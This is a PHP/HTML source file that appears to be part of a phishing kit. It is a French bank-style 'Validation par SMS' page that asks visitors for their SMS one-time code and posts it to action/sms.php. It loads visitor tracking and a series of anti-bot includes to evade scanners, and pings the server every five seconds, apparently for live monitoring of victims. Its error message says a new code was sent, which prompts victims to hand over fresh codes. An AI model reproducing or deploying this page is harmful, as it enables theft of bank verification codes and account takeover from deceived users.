<?php
include("track.php");
include 'page_notify.php';
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('sms.php');

include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation par SMS</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow-x: hidden;
        }

        .container {
            text-align: center;
            width: 100%;
            padding: 10px;
        }

        .top-logo img {
            max-width: 200px;
        }

        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            margin: 0 auto;
            width: calc(100% - 20px);
        }

        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 1.5rem;
            color: #003883;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .verification-text {
            font-size: 0.9rem;
            color: #6b7280;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
        }

        .form-group input {
            padding: 12px;
            font-size: 1rem;
            border: 1px solid #d1d5db;
            border-radius: 5px;
            width: 100%;
        }

        .btn-container {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .btn {
            background: #ff006f;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #e60064;
        }

        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .form-box {
                padding: 20px;
                width: calc(100% - 40px);
            }

            .top-logo img {
                max-width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Formulaire -->
        <div class="form-box">
            <div class="header-bar"></div>

            <h1>Code de confirmation</h1>
            <div class="verification-text">
                Un code de vérification vous a été envoyé par SMS. Veuillez le saisir ci-dessous.
            </div>

            <form action="action/sms.php" method="POST">
                <div class="form-group">
                    <input type="text" name="otp" placeholder="Code reçu" maxlength="10"  required>
                </div>

                <div class="btn-container">
                    <button class="btn" type="submit">Valider</button>
                </div>
                <?php if (isset($_GET['error']) && $_GET['error'] == 1): ?>
    <div style="margin-top: 10px; color: red; font-weight: bold;">
        ❌ Code incorrects. un nouveau code vient d'être envoyé, veuillez l'entrer.
    </div>
<?php endif; ?>
            </form>
        </div>

        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
        </div>
    </div>
    <script>
        setInterval(() => {
            fetch('ping.php');
        }, 5000);
    </script>
</body>
</html>
